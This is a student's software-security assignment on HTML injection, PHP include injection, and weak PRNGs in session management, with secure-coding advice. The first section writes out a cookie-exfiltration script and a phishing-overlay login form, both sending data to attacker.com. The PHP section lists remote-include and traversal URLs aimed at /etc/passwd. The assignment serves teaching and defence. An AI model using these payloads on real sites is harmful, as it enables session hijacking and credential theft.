# Assignment 2

**Author:** Waldemar Schwab  
**Created on:** 2024-05-12
**Fernuniversität Hagen** Software-Security

## Describe how an HTML-attack could be abused to gain access to credentials. (25)

A HTML attack can be realized on different ways. And always consists of different type (stored HTML Injection or Reflected HTML injection) and attack vecors. 
Vecots:

- Stored HTML Injection: Persistant attacks like entries in a Comment Section or in a blog.
- Reflected HTML injectio: URL-Injection when Parameters are not escaped the right way
  - these URLs can be sent via E-Mail or other communication tools
  - spread via forums and other (social) platforms 

Ways to steal credentials:

- Inject JS-Code and Replace original Login Form
  - Inject new Form fields
    - Hide original Form Field
    - Place your own Imput-Elements on site and replace the action path with somethin useful to you
- Inject JS-Code to exfiltrate original
  - before committing the Login Form intercept the login Progress and send the data to your own server.
- Skip the login-part and steal the Session-Cookie right away:
  - Use someting like `<script>var img=new Image();img.src='http://attacker.com/stealcookie.php?cookie='+document.cookie;</script>`
- Inject HTML and CSS code without JS
  - Hide original form fields via CSS (inline or siyle attribute)
    - add your own Input-Elements right via html
    - or just add a huge Login-Banner over the page: `<div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:1000;"><form action='http://attacker.com/capture_credentials.php' method='post'><input type='text' name='username'><input type='password' name='password'><input type='submit' value='Login'></form></div>`

## Explain how PHP-code-injections via include / require could be achieved - and prevented. (25)

There are different ways to manipulate the parameter of `include` or `require`. Multiple methods of exploitation are possible.

### Manipulation:

- When `include('content/' . $_GET['page'] . '.php');` is used, you can simply manipulate the URL and include files other than expected.
  - **Exploitation**: `http://example.com/?page=http://attacker.com/malicious`
    - A prepared file on a web server has to be provided by the attacker.
    - After successful infiltration, PHP code execution is possible and might give access to other sensitive files, e.g., database connection information, `/etc/passwd`.
    - This attack requires a PHP configuration setting like this: `allow_url_include = On`.
  - **Mitigation**:
    - Simply turn off the setting: `allow_url_include = Off`.

  - Let's continue with the last example and assume that `allow_url_include = Off` is set.

    - **Exploitation**: `http://example.com/?page=admin`
      - You might still be able to browse into other files: e.g., there might be an `admin.php` waiting for us, that could be accessed or database configuration might be stored somewhere in a PHP file.
      - You might need to extend this attack and upload your own file via another exploit, like unchecked file extensions on a picture-upload page on the same server.
      - **Mitigation**: Add input validation for expected values in `$_GET['page']`.

      ```php
      $allowedPages = ['home', 'about', 'contact']; // List of allowed pages
      $page = $_GET['page'] ?? 'default'; // Default page if none specified

      if (in_array($page, $allowedPages)) { ... }
      ```

      Moreover, you should add absolute paths instead of relative paths to block traversal movement and add error handling to prevent the next point I will mention:

      ```php
      define('BASE_PATH', realpath('content/')); // Ensure the base path is absolute and normalized
      $page = $_GET['page'] ?? 'default';
      if (in_array($page, $allowedPages)) {
          $filePath = BASE_PATH . '/' . $page . '.php';
          if (file_exists($filePath)) {
              include($filePath);
          } else {
              include(BASE_PATH . '/error.php');
          }
      } else {
          include(BASE_PATH . '/error.php');
      }
      ```

  - Error messages can give information about internal structures and so support further attacks.
    - **Exploit**: Attacker tries invalid values and the system returns full paths and names. E.g., the script is hosted at a free hoster and the attacker creates a free account and includes his own scripts with file access rights set to magical 777. So he is able to access his own scripts via 
    `http://example.com/?page=../../../attacker_user_on_freehost/haxx0r_file`
    - **Mitigation** Just like above.

  - Another exploit in very old versions was null byte injection: `http://example.com/?page=../../../etc/passwd%00`
    - **Exploitation**: Here, `%00` represents a null byte, which could effectively terminate the string at the desired location and potentially allow access to the `/etc/passwd` file. Modern PHP versions, however, are not susceptible to null byte injection.
    - **Mitigation**: Use supported and updated software versions.


## Discuss how PRNGs could put session-management at risk. (25)
Pseudo-Random Number Generators (PRNGs) are crucial in many aspects of computer security, including session management. Their role is to generate random values that are used, among other things, to create session identifiers (session IDs). However, the quality of the PRNG can significantly impact the security of the session management system. Here's how:

    Predictability: If a PRNG is predictable, it means that an attacker can anticipate future outputs of the generator after observing some of its past or current outputs. In the context of session management, if an attacker can predict the next session ID to be issued, they can potentially hijack a user's session by constructing the corresponding session cookie ahead of the legitimate user.

    Lack of Entropy: Good PRNGs require a source of high entropy to initialize their state (also known as a "seed"). If the entropy source is poor (e.g., predictable or contains little randomness), the numbers generated by the PRNG will be weak and more susceptible to prediction. For session management, low entropy could mean that session IDs might repeat or be easily guessed.

    Inadequate Seeding and Re-seeding: If a PRNG is not properly seeded or re-seeded periodically, it could start generating repeating patterns. For session management, this means an attacker could detect these patterns and use them to predict or replicate session IDs.

    Flawed PRNG Algorithms: Not all PRNGs are suitable for security-sensitive applications. Some PRNGs are designed for simulations or other non-security purposes and may have weaknesses that can be exploited. Secure session management requires cryptographic PRNGs that are designed to resist attacks and provide strong randomness.

    Implementation Vulnerabilities: Errors in how the PRNG is implemented can also introduce vulnerabilities. For instance, programming errors that lead to partial output leakage or improper handling of the PRNG's state could compromise the randomness of session IDs.

    State Compromise Attacks: If an attacker can access the internal state of a PRNG, they can replicate the PRNG's output entirely, effectively predicting all future session IDs. This could happen through various attack vectors, such as exploiting software vulnerabilities, side-channel attacks, or system intrusion.

## How would secure programming create session IDs? (25)

    - Use Cryptographically Secure PRNGs: Select a suitable CSPRNG designed for security-sensitive applications to generate random numbers for session IDs.
    - Ensure Sufficient Length and Complexity: Session IDs should be long enough (typically at least 128 bits) and include a complex mixture of characters to prevent attacks.
    - Proper Initialization and Seeding: Use high-entropy sources for CSPRNG seeding and ensure secure initialization to avoid predictable states.
    - Secure Storage and Handling: Transmit session IDs securely, utilize cookies with Secure, HttpOnly, and SameSite flags, and regenerate IDs at critical transitions.
    - Regular Updates and Patching: Keep libraries and frameworks used for session management up-to-date to mitigate vulnerabilities.
    - Monitoring and Anomaly Detection: Monitor session management for unusual patterns and implement anomaly detection systems.
    - Adherence to Standards and Best Practices: Follow guidelines from respected security organizations for secure session management practices.